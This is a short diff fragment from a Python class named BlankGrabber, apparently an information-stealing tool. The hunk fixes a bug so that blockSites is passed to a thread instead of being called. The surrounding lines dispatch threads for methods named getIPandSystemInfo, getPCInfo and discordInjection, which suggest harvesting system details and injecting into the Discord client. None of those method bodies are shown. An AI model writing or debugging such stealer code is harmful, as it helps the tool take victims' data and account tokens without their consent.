@@ -743,7 +743,7 @@ class BlankGrabber:
             self.getIPandSystemInfo,
             self.getPCInfo,
             self.discordInjection,
-            self.blockSites()
+            self.blockSites
         ):
             t = Thread(target= func)
             t.start()
